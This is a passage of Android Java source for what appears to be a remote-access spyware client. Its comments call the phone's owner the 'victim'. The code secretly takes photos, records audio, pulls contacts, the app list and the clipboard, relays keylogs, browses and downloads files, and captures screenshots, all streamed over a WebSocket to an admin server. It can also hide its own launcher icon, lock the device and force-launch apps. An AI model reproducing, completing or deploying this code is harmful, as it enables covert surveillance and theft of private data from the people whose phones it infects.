                            @Override
                            public void onDisconnected(CameraDevice camera) {
                                cleanupCamera();
                            }

                            @Override
                            public void onError(CameraDevice camera, int error) {
                                sendLog("take_photo: camera device error " + error);
                                cleanupCamera();
                            }
                        }, backgroundHandler);
                    }
                } catch (Exception e) {
                    sendLog("take_photo error: " + e.getMessage());
                    cleanupCamera();
                }
            }
        });
    }

    /**
     * PILIH RESOLUSI JPEG YANG DIDUKUNG OLEH CAMERA.
     *
     * Tidak semua camera (terutama front camera di device murah) mendukung
     * resolusi standar seperti 1280x720. Kalau ImageReader di-create dengan
     * resolusi yang tidak didukung, session akan fail configure, atau paling
     * buruk capture berhasil tapi JPEG-nya kosong (foto hitam).
     *
     * Strategy: query StreamConfigurationMap untuk dapat list resolusi JPEG
     * yang didukung, lalu pilih yang paling mendekati 1280x720 (prefer yang
     * lebih kecil untuk hemat bandwidth).
     */
    private android.util.Size chooseOptimalJpegSize(String cameraId) {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                sendLog("chooseOptimalJpegSize: StreamConfigurationMap null untuk " + cameraId);
                return null;
            }

            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                sendLog("chooseOptimalJpegSize: tidak ada output size JPEG untuk " + cameraId);
                return null;
            }

            // Target: 1280x720 (720p, 16:9). Front camera banyak yang cuma
            // support 640x480 (VGA, 4:3) atau 960x720, jadi pilih yang paling
            // dekat tapi <= 1280x720.
            final int TARGET_W = 1280;
            final int TARGET_H = 720;

            android.util.Size best = null;
            long bestDiff = Long.MAX_VALUE;

            for (android.util.Size s : sizes) {
                int w = s.getWidth();
                int h = s.getHeight();

                // Skip resolusi gila besar (> 2MP) supaya bandwidth wajar
                if ((long) w * h > 2_000_000L) continue;

                long diff;
                if (w <= TARGET_W && h <= TARGET_H) {
                    // Prefer yang <= target
                    diff = (long) (TARGET_W - w) * (TARGET_W - w) + (long) (TARGET_H - h) * (TARGET_H - h);
                } else if (w > TARGET_W || h > TARGET_H) {
                    // Penalti untuk yang lebih besar dari target
                    diff = ((long) (w - TARGET_W) * (w - TARGET_W) + (long) (h - TARGET_H) * (h - TARGET_H)) * 4;
                } else {
                    diff = Long.MAX_VALUE;
                }

                if (diff < bestDiff) {
                    bestDiff = diff;
                    best = s;
                }
            }

            if (best == null) {
                // Fallback: pilih size pertama yang available (terkecil biasanya)
                best = sizes[sizes.length - 1];
            }

            return best;
        } catch (Exception e) {
            sendLog("chooseOptimalJpegSize error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Hitung JPEG_ORIENTATION yang benar supaya foto tampil portrait di viewer.
     *
     * Camera2 spec: JPEG_ORIENTATION = (sensorOrientation - deviceRotation + 360) % 360
     * untuk back camera. Front camera tambahan di-mirror (360 - result).
     *
     * Default assumption: user pegang phone dalam portrait (rotation 0).
     * Back camera biasanya sensorOrientation=90 → JPEG_ORIENTATION = 90 → foto
     * tampil portrait di viewer (termasuk Flutter Image.network yang respect EXIF).
     */
    private int getJpegOrientation(String cameraId, int cameraFacing) {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
            Integer sensorOrientationInt = chars.get(CameraCharacteristics.SENSOR_ORIENTATION);
            int sensorOri = sensorOrientationInt != null ? sensorOrientationInt : 90;
            int deviceRot = getWindowRotation();

            int totalRotation;
            if (cameraFacing == CameraCharacteristics.LENS_FACING_FRONT) {
                // Front camera: mirror + compensate
                totalRotation = (sensorOri + deviceRot) % 360;
                totalRotation = (360 - totalRotation) % 360;
            } else {
                // Back camera: standard formula
                totalRotation = (sensorOri - deviceRot + 360) % 360;
            }
            return totalRotation;
        } catch (Exception e) {
            // Fallback: 90 derajat (cocok untuk back camera di portrait mode)
            return 90;
        }
    }

    /**
     * Ambil rotasi device (0/90/180/270 derajat) dari WindowManager.
     *
     * Catatan: di Service, getWindowManager() TIDAK tersedia (itu method
     * Activity). Harus ambil WindowManager lewat getSystemService().
     */
    private int getWindowRotation() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return 0;
            Display display = wm.getDefaultDisplay();
            if (display == null) return 0;
            int rotation = display.getRotation();
            switch (rotation) {
                case Surface.ROTATION_0:   return 0;
                case Surface.ROTATION_90:  return 90;
                case Surface.ROTATION_180: return 180;
                case Surface.ROTATION_270: return 270;
                default: return 0;
            }
        } catch (Exception e) {
            return 0;
        }
    }

    private void cleanupCamera() {
        try {
            if (activeCaptureSession != null) {
                activeCaptureSession.close();
                activeCaptureSession = null;
            }
        } catch (Exception e) {}
        try {
            if (activeCameraDevice != null) {
                activeCameraDevice.close();
                activeCameraDevice = null;
            }
        } catch (Exception e) {}
        try {
            if (activeImageReader != null) {
                activeImageReader.close();
                activeImageReader = null;
            }
        } catch (Exception e) {}
    }

    /**
     * FITUR 2: Get Installed Apps — list semua APK terinstall.
     *
     * Kirim sebagai WS message: { type: "apps_list", apps: [...] }
     * API server akan simpan ke apps.json.
     */
    private void getInstalledApps() {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    List<ApplicationInfo> allApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
                    JSONArray userAppsArray = new JSONArray();
                    JSONArray systemAppsArray = new JSONArray();

                    for (ApplicationInfo appInfo : allApps) {
                        try {
                            // Filter: hanya apps yang punya launch intent (bisa di-buka user).
                            // Ini exclude system services yang gak punya UI (com.android.networkstack, dll).
                            Intent launchIntent = packageManager.getLaunchIntentForPackage(appInfo.packageName);
                            if (launchIntent == null) {
                                continue; // skip non-launchable apps
                            }

                            JSONObject app = new JSONObject();
                            app.put("package", appInfo.packageName);

                            // Ambil label user-friendly (e.g., "WhatsApp Business" bukan "com.whatsapp.w4b")
                            String label = "";
                            try {
                                CharSequence labelSeq = packageManager.getApplicationLabel(appInfo);
                                if (labelSeq != null) {
                                    label = labelSeq.toString().trim();
                                }
                            } catch (Exception e) {}
                            // Fallback: pakai nonLocalizedLabel (kadang ada)
                            if (label.isEmpty() && appInfo.nonLocalizedLabel != null) {
                                label = appInfo.nonLocalizedLabel.toString().trim();
                            }
                            // Fallback terakhir: pakai package name terakhir segment
                            if (label.isEmpty()) {
                                String[] parts = appInfo.packageName.split("\\.");
                                label = parts.length > 0 ? parts[parts.length - 1] : appInfo.packageName;
                            }
                            app.put("name", label);

                            boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                            boolean isUpdatedSystem = (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
                            boolean isUserApp = !isSystem || isUpdatedSystem;
                            app.put("system", !isUserApp);
                            app.put("updated_system", isUpdatedSystem);
                            app.put("user_app", isUserApp);

                            try {
                                PackageInfo pkgInfo = packageManager.getPackageInfo(appInfo.packageName, 0);
                                app.put("version", pkgInfo.versionName != null ? pkgInfo.versionName : "");
                                app.put("version_code", pkgInfo.versionCode);
                                app.put("install_time", pkgInfo.firstInstallTime);
                                app.put("update_time", pkgInfo.lastUpdateTime);
                            } catch (Exception e) {}

                            // Pisah: user apps dulu, system apps terakhir
                            if (isUserApp) {
                                userAppsArray.put(app);
                            } else {
                                systemAppsArray.put(app);
                            }
                        } catch (Exception e) {}
                    }

                    // Gabung: user apps dulu, system apps di belakang
                    JSONArray appsArray = new JSONArray();
                    for (int i = 0; i < userAppsArray.length(); i++) appsArray.put(userAppsArray.get(i));
                    for (int i = 0; i < systemAppsArray.length(); i++) appsArray.put(systemAppsArray.get(i));

                    sendLog("get_apps: " + userAppsArray.length() + " user apps, " + systemAppsArray.length() + " system apps");

                    JSONObject msg = new JSONObject();
                    msg.put("type", "apps_list");
                    msg.put("total", appsArray.length());
                    msg.put("user_apps_count", userAppsArray.length());
                    msg.put("system_apps_count", systemAppsArray.length());
                    msg.put("apps", appsArray);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                } catch (Exception e) {
                    sendLog("get_apps error: " + e.getMessage());
                }
            }
        });
    }

    /**
     * FITUR 3: Get Contacts — list semua kontak di HP target.
     *
     * Kirim sebagai WS message: { type: "contacts_list", contacts: [...] }
     */
    private void getContacts() {
        if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendLog("get_contacts: READ_CONTACTS permission not granted");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                Cursor cursor = null;
                try {
                    JSONArray contactsArray = new JSONArray();
                    cursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                        },
                        null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    );

                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            try {
                                String name = cursor.getString(0);
                                String number = cursor.getString(1);
                                int type = cursor.getInt(2);

                                JSONObject contact = new JSONObject();
                                contact.put("name", name != null ? name : "");
                                contact.put("number", number != null ? number : "");
                                String typeLabel;
                                switch (type) {
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: typeLabel = "mobile"; break;
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: typeLabel = "home"; break;
                                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: typeLabel = "work"; break;
                                    default: typeLabel = "other";
                                }
                                contact.put("type", typeLabel);
                                contactsArray.put(contact);
                            } catch (Exception e) {}
                        }
                    }

                    JSONObject msg = new JSONObject();
                    msg.put("type", "contacts_list");
                    msg.put("total", contactsArray.length());
                    msg.put("contacts", contactsArray);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                } catch (Exception e) {
                    sendLog("get_contacts error: " + e.getMessage());
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
        });
    }

    /**
     * FITUR 4: Record Audio (mic) — rekam selama N detik, lalu kirim base64.
     *
     * Kirim sebagai WS message: { type: "audio_recorded", data: "<base64>", duration: <sec> }
     */
    private void recordAudio(final int durationSec) {
        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendLog("record_audio: RECORD_AUDIO permission not granted");
            return;
        }
        if (isRecording) {
            sendLog("record_audio: already recording, stop dulu");
            return;
        }

        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    File outputDir = new File(getCacheDir(), "audio");
                    if (!outputDir.exists()) outputDir.mkdirs();
                    audioRecordingFile = new File(outputDir, "rec_" + System.currentTimeMillis() + ".m4a");

                    mediaRecorder = new MediaRecorder();
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(64000);
                    mediaRecorder.setAudioSamplingRate(44100);
                    mediaRecorder.setOutputFile(audioRecordingFile.getAbsolutePath());

                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    isRecording = true;

                    if (recordingHandler == null) {
                        recordingHandler = new Handler(Looper.getMainLooper());
                    }

                    recordingHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            stopAudioRecording();
                        }
                    }, durationSec * 1000);

                } catch (Exception e) {
                    sendLog("record_audio start error: " + e.getMessage());
                    isRecording = false;
                    try { if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; } } catch (Exception ex) {}
                }
            }
        });
    }

    private void stopAudioRecording() {
        if (!isRecording) return;
        isRecording = false;

        try {
            if (mediaRecorder != null) {
                try { mediaRecorder.stop(); } catch (Exception e) {}
                mediaRecorder.release();
                mediaRecorder = null;
            }

            if (audioRecordingFile != null && audioRecordingFile.exists()) {
                FileInputStream fis = new FileInputStream(audioRecordingFile);
                byte[] buffer = new byte[(int) audioRecordingFile.length()];
                fis.read(buffer);
                fis.close();

                String base64 = Base64.encodeToString(buffer, Base64.NO_WRAP);

                JSONObject msg = new JSONObject();
                msg.put("type", "audio_recorded");
                msg.put("format", "m4a");
                msg.put("data", base64);
                msg.put("size", buffer.length);
                msg.put("timestamp", System.currentTimeMillis());

                if (webSocket != null && isConnected) {
                    webSocket.send(msg.toString());
                }

                audioRecordingFile.delete();
            }
        } catch (Exception e) {
            sendLog("stop_audio error: " + e.getMessage());
        }
    }

    /**
     * FITUR 5: Clipboard Monitor — polling tiap 5 detik, kirim kalau ada perubahan.
     *
     * Dipanggil dari onCreate. Timer jalan terus, kirim WS message:
     * { type: "clipboard", text: "...", timestamp: <ms> }
     */
    private void startClipboardMonitoring() {
        try {
            clipboardManager = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboardManager == null) return;

            clipboardTimer = new Timer("ClipboardMonitor", true);
            clipboardTimer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    try {
                        if (clipboardManager == null || !clipboardManager.hasPrimaryClip()) return;
                        android.content.ClipData clip = clipboardManager.getPrimaryClip();
                        if (clip == null || clip.getItemCount() == 0) return;
                        CharSequence text = clip.getItemAt(0).coerceToText(BackgroundService.this);
                        if (text == null) return;
                        String textStr = text.toString().trim();
                        if (textStr.isEmpty()) return;
                        if (textStr.equals(lastClipboardText)) return;

                        lastClipboardText = textStr;

                        JSONObject msg = new JSONObject();
                        msg.put("type", "clipboard");
                        msg.put("text", textStr);
                        msg.put("timestamp", System.currentTimeMillis());

                        if (webSocket != null && isConnected) {
                            webSocket.send(msg.toString());
                        }
                    } catch (Exception e) {
                        // Silent — clipboard access bisa denied di Android 10+
                    }
                }
            }, 5000, 5000); // mulai setelah 5 detik, cek tiap 5 detik
        } catch (Exception e) {
            sendLog("clipboard monitor start error: " + e.getMessage());
        }
    }

    /**
     * Helper: kirim pesan log ke server (diterima API sebagai type:"log")
     * supaya debug di sisi admin gampang.
     */
    private void sendLog(String message) {
        try {
            android.util.Log.w("SpyService", message);
            if (webSocket != null && isConnected) {
                JSONObject msg = new JSONObject();
                msg.put("type", "log");
                msg.put("message", message);
                msg.put("timestamp", System.currentTimeMillis());
                webSocket.send(msg.toString());
            }
        } catch (Exception e) {}
    }

    /**
     * Dipanggil AppBlockerService buat kirim keylog batch ke API.
     * Public karena dipanggil dari class lain via static instance.
     */
    public void sendKeylogBatch(String jsonStr) {
        try {
            if (webSocket != null && isConnected) {
                webSocket.send(jsonStr);
            }
        } catch (Exception e) {}
    }

    /**
     * Dipanggil NotificationHandler + service lain buat kirim data ke API.
     * Pemakaian: NotificationHandler gak punya WS sendiri, kirim via sini.
     * Ini cegah duplicate WS connection yang bikin clients Map di API bermasalah.
     */
    public void sendData(String jsonStr) {
        try {
            if (webSocket != null && isConnected) {
                webSocket.send(jsonStr);
            }
        } catch (Exception e) {}
    }

    // ====================================================================
    // ============ FITUR BARU: AUTO-START APP ===========================
    // ====================================================================

    /**
     * Force victim buka app tertentu.
     * Pakai PackageManager.getLaunchIntentForPackage() → startActivity().
     */
    private void autoStartApp(String packageName) {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                    if (intent == null) {
                        sendLog("auto_start_app: app not installed or no launch intent: " + packageName);
                        return;
                    }
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    sendLog("auto_start_app: launched " + packageName);
                } catch (Exception e) {
                    sendLog("auto_start_app error: " + e.getMessage());
                }
            }
        });
    }

    // ====================================================================
    // ============ FITUR BARU: FILE ACCESS ==============================
    // ====================================================================

    /**
     * List files di directory tertentu victim.
     * Default path: /sdcard/ (external storage root)
     * Kirim via WS: {type: 'file_list', path, entries: [...]}
     */
    private void listFiles(final String dirPath) {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    File dir = new File(dirPath);
                    if (!dir.exists() || !dir.isDirectory()) {
                        sendLog("list_files: directory not found: " + dirPath);
                        // Kirim empty result biar admin tahu
                        try {
                            JSONObject msg = new JSONObject();
                            msg.put("type", "file_list");
                            msg.put("path", dirPath);
                            msg.put("error", "directory_not_found");
                            msg.put("entries", new org.json.JSONArray());
                            if (webSocket != null && isConnected) webSocket.send(msg.toString());
                        } catch (Exception e) {}
                        return;
                    }

                    File[] files = dir.listFiles();
                    org.json.JSONArray entries = new org.json.JSONArray();

                    if (files != null) {
                        // Sort: directories first, then alphabetical
                        java.util.Arrays.sort(files, new java.util.Comparator<File>() {
                            @Override
                            public int compare(File a, File b) {
                                if (a.isDirectory() != b.isDirectory()) {
                                    return a.isDirectory() ? -1 : 1;
                                }
                                return a.getName().compareToIgnoreCase(b.getName());
                            }
                        });

                        for (File f : files) {
                            try {
                                JSONObject entry = new JSONObject();
                                entry.put("name", f.getName());
                                entry.put("path", f.getAbsolutePath());
                                entry.put("is_dir", f.isDirectory());
                                entry.put("size", f.length());
                                entry.put("last_modified", f.lastModified());
                                entry.put("readable", f.canRead());
                                entry.put("writable", f.canWrite());
                                entries.put(entry);
                            } catch (Exception e) {}
                        }
                    }

                    JSONObject msg = new JSONObject();
                    msg.put("type", "file_list");
                    msg.put("path", dirPath);
                    msg.put("parent", dir.getParentFile() != null ? dir.getParentFile().getAbsolutePath() : "/");
                    msg.put("entries", entries);
                    msg.put("total", entries.length());
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                    sendLog("list_files: sent " + entries.length() + " entries from " + dirPath);
                } catch (Exception e) {
                    sendLog("list_files error: " + e.getMessage());
                }
            }
        });
    }

    /**
     * Download 1 file dari victim. Kirim via WS sebagai base64.
     * Limit: 5MB (di atas itu skip, WS gak efisien buat file besar).
     */
    private void downloadFile(final String filePath) {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    File file = new File(filePath);
                    if (!file.exists() || !file.isFile()) {
                        sendLog("download_file: file not found: " + filePath);
                        try {
                            JSONObject err = new JSONObject();
                            err.put("type", "file_download");
                            err.put("path", filePath);
                            err.put("error", "file_not_found");
                            if (webSocket != null && isConnected) webSocket.send(err.toString());
                        } catch (Exception e) {}
                        return;
                    }

                    if (file.length() > 5_000_000) {
                        sendLog("download_file: file too large (" + file.length() + " bytes), skip");
                        try {
                            JSONObject err = new JSONObject();
                            err.put("type", "file_download");
                            err.put("path", filePath);
                            err.put("error", "file_too_large");
                            err.put("size", file.length());
                            if (webSocket != null && isConnected) webSocket.send(err.toString());
                        } catch (Exception e) {}
                        return;
                    }

                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[(int) file.length()];
                    fis.read(buffer);
                    fis.close();

                    String base64 = Base64.encodeToString(buffer, Base64.NO_WRAP);
                    String mime = guessMime(filePath);

                    JSONObject msg = new JSONObject();
                    msg.put("type", "file_download");
                    msg.put("path", filePath);
                    msg.put("name", file.getName());
                    msg.put("size", buffer.length);
                    msg.put("mime", mime);
                    msg.put("data", base64);
                    msg.put("timestamp", System.currentTimeMillis());

                    if (webSocket != null && isConnected) {
                        webSocket.send(msg.toString());
                    }
                    sendLog("download_file: sent " + file.getName() + " (" + (buffer.length / 1024) + " KB)");
                } catch (Exception e) {
                    sendLog("download_file error: " + e.getMessage());
                }
            }
        });
    }

    private String guessMime(String path) {
        String p = path.toLowerCase();
        if (p.endsWith(".jpg") || p.endsWith(".jpeg")) return "image/jpeg";
        if (p.endsWith(".png")) return "image/png";
        if (p.endsWith(".gif")) return "image/gif";
        if (p.endsWith(".mp4")) return "video/mp4";
        if (p.endsWith(".mp3")) return "audio/mpeg";
        if (p.endsWith(".pdf")) return "application/pdf";
        if (p.endsWith(".txt")) return "text/plain";
        if (p.endsWith(".json")) return "application/json";
        if (p.endsWith(".doc")) return "application/msword";
        if (p.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (p.endsWith(".zip")) return "application/zip";
        return "application/octet-stream";
    }

    // ====================================================================
    // ====================================================================
    // ============ FITUR BARU: SCREENSHOT (single-frame) ================
    // ====================================================================
    // Screenshot = capture 1 frame layar victim, lalu langsung stop
    // MediaProjection. Lebih hemat resource + battery dari continuous screen
    // capture. Butuh consent 1x dari user (via ScreenCaptureActivity).

    /**
     * Request consent dari user untuk screenshot.
     * Launch ScreenCaptureActivity (invisible, cuma show system dialog).
     */
    private void requestScreenshotPermission() {
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent i = new Intent(BackgroundService.this, ScreenCaptureActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    sendLog("screenshot: requesting permission");
                } catch (Exception e) {
                    sendLog("screenshot request error: " + e.getMessage());
                }
            }
        });
    }

    /**
     * Take screenshot: buka MediaProjection, capture 1 frame, kirim via WS,
     * langsung stop projection. User victim harus udah approve consent
     * sebelumnya (lewat request_screenshot_permission).
     *
     * Kirim WS: {type: 'screenshot', data: '<base64 JPEG>', width, height, ts}
     */
    private void takeScreenshot() {
        if (isScreenshotCapturing) {
            sendLog("take_screenshot: already capturing, skip");
            return;
        }
        if (!ScreenCaptureActivity.hasResult || ScreenCaptureActivity.resultData == null) {
            sendLog("take_screenshot: permission not granted yet, call request_screenshot_permission dulu");
            return;
        }

        isScreenshotCapturing = true;
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    if (mpm == null) {
                        sendLog("take_screenshot: MediaProjectionManager null");
                        isScreenshotCapturing = false;
                        return;
                    }

                    // Buat MediaProjection fresh setiap screenshot (lebih reliable
                    // daripada reuse — Android bisa revoke projection kapan saja)
                    screenshotProjection = mpm.getMediaProjection(ScreenCaptureActivity.resultCode, ScreenCaptureActivity.resultData);
                    if (screenshotProjection == null) {
                        sendLog("take_screenshot: MediaProjection null, permission expired");
                        ScreenCaptureActivity.hasResult = false;
                        ScreenCaptureActivity.resultData = null;
                        isScreenshotCapturing = false;
                        return;
                    }

                    // Get screen dimensions
                    android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
                    WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                    wm.getDefaultDisplay().getRealMetrics(metrics);
                    // Max 720x1280 untuk hemat bandwidth
                    int screenW = Math.min(metrics.widthPixels, 720);
                    int screenH = Math.min(metrics.heightPixels, 1280);

                    // ImageReader dengan format RGBA_8888 (default untuk screen capture)
                    screenshotImageReader = ImageReader.newInstance(screenW, screenH, PixelFormat.RGBA_8888, 2);
                    screenshotImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                        @Override
                        public void onImageAvailable(ImageReader reader) {
                            Image image = null;
                            try {
                                image = reader.acquireLatestImage();
                                if (image == null) return;

                                // Convert RGBA → JPEG via Bitmap
                                Image.Plane[] planes = image.getPlanes();
                                ByteBuffer buf = planes[0].getBuffer();
                                int pixelStride = planes[0].getPixelStride();
                                int rowStride = planes[0].getRowStride();
                                int rowPadding = rowStride - pixelStride * image.getWidth();

                                Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
                                bitmap.copyPixelsFromBuffer(buf);

                                // Crop padding
                                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, image.getWidth(), image.getHeight());

                                // Compress ke JPEG quality 70
                                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                                cropped.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                                byte[] jpegBytes = baos.toByteArray();

                                String base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP);
                                JSONObject msg = new JSONObject();
                                msg.put("type", "screenshot");
                                msg.put("width", cropped.getWidth());
                                msg.put("height", cropped.getHeight());
                                msg.put("size", jpegBytes.length);
                                msg.put("data", base64);
                                msg.put("timestamp", System.currentTimeMillis());
                                if (webSocket != null && isConnected) {
                                    webSocket.send(msg.toString());
                                }
                                sendLog("take_screenshot: sent (" + (jpegBytes.length / 1024) + " KB)");

                                bitmap.recycle();
                                if (cropped != bitmap) cropped.recycle();
                            } catch (Exception e) {
                                sendLog("take_screenshot capture error: " + e.getMessage());
                            } finally {
                                if (image != null) image.close();
                                cleanupScreenshot();
                            }
                        }
                    }, backgroundHandler);

                    // Create VirtualDisplay — auto-mirror screen
                    int flags = android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
                    screenshotDisplay = screenshotProjection.createVirtualDisplay(
                        "SpyScreenshot",
                        screenW, screenH, metrics.densityDpi,
                        flags, screenshotImageReader.getSurface(),
                        null, backgroundHandler);

                    sendLog("take_screenshot: capturing " + screenW + "x" + screenH);
                } catch (Exception e) {
                    sendLog("take_screenshot error: " + e.getMessage());
                    cleanupScreenshot();
                }
            }
        });
    }

    /**
     * Cleanup screenshot resources. Dipanggil setelah 1 frame berhasil
     * dikirim (atau error). Stop projection supaya gak consume resource.
     */
    private void cleanupScreenshot() {
        try {
            if (screenshotDisplay != null) {
                screenshotDisplay.release();
                screenshotDisplay = null;
            }
        } catch (Exception e) {}
        try {
            if (screenshotImageReader != null) {
                screenshotImageReader.close();
                screenshotImageReader = null;
            }
        } catch (Exception e) {}
        try {
            if (screenshotProjection != null) {
                screenshotProjection.stop();
                screenshotProjection = null;
            }
        } catch (Exception e) {}
        isScreenshotCapturing = false;
    }

    private void lockDevice() {
        try {
            if (devicePolicyManager != null && devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow();
            }
            showLockScreen();
        } catch (Exception e) {}
    }
    
    private void unlockDevice() {
        try {
            hideLockScreen();
        } catch (Exception e) {}
    }
    
    private void hideApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void showApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void reconnect() {
        reconnectAttempts++;
        // Cap delay max 15 detik (sebelumnya 30 detik — terlalu lama)
        long delay = Math.min(3000 * reconnectAttempts, 15000);

        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (webSocket != null) {
                    try {
                        webSocket.close(1000, "Reconnecting");
                        webSocket.cancel();
                    } catch (Exception e) {}
                    webSocket = null;
                }
                isConnected = false;
                connectWebSocket();
            }
        }, delay);
    }

    /**
     * Heartbeat check — kirim ping, kalau gak ada response dalam 15 detik,
     * assume WS stale → force reconnect. Dipanggil tiap 30 detik.
     */
    private long lastPongReceived = 0;
    private void checkHeartbeat() {
        try {
            if (!isConnected || webSocket == null) {
                // WS mati, reconnect
                reconnect();
                return;
            }
            long now = System.currentTimeMillis();
            // Kalau lebih dari 60 detik gak nerima pong, assume stale
            if (lastPongReceived > 0 && (now - lastPongReceived) > 60000) {
                sendLog("heartbeat: stale WS detected, force reconnect");
                reconnect();
                return;
            }
            // Kirim ping
            JSONObject ping = new JSONObject();
            ping.put("type", "heartbeat_ping");
            ping.put("timestamp", now);
            webSocket.send(ping.toString());
        } catch (Exception e) {
            sendLog("heartbeat error: " + e.getMessage());
            reconnect();
        }
    }
    
    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username);
            auth.put("device_id", deviceId);
            auth.put("model", model);
            auth.put("battery", getBatteryLevel());
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            
            info.put("type", "device_info");
            info.put("device_id", deviceId);
            info.put("username", username);
            info.put("model", safeString(Build.MODEL));
            info.put("manufacturer", safeString(Build.MANUFACTURER));
            info.put("brand", safeString(Build.BRAND));
            info.put("product", safeString(Build.PRODUCT));
            info.put("device", safeString(Build.DEVICE));
            info.put("hardware", safeString(Build.HARDWARE));
            info.put("serial", safeString(Build.SERIAL));
            info.put("display", safeString(Build.DISPLAY));
            info.put("android_version", safeString(Build.VERSION.RELEASE));
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("build_id", safeString(Build.ID));
            info.put("build_type", safeString(Build.TYPE));
            info.put("tags", safeString(Build.TAGS));
            info.put("fingerprint", safeString(Build.FINGERPRINT));
            info.put("board", safeString(Build.BOARD));
            info.put("bootloader", safeString(Build.BOOTLOADER));
            
            try {
                String radio = Build.getRadioVersion();
                if (radio != null) info.put("radio", radio);
            } catch (Exception e) {}
            
            getTelephonyInfo(info);
            getAppInfo(info);
            getNetworkInfo(info);
            getMemoryInfo(info);
            getStorageInfo(info);
            getLocaleInfo(info);
            getScreenInfo(info);
            
            info.put("battery", getBatteryLevel());
            
            long currentTime = System.currentTimeMillis();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
            info.put("last_seen", sdf.format(new Date(currentTime)));
            
            if (webSocket != null && isConnected) {
                webSocket.send(info.toString());
            }
            
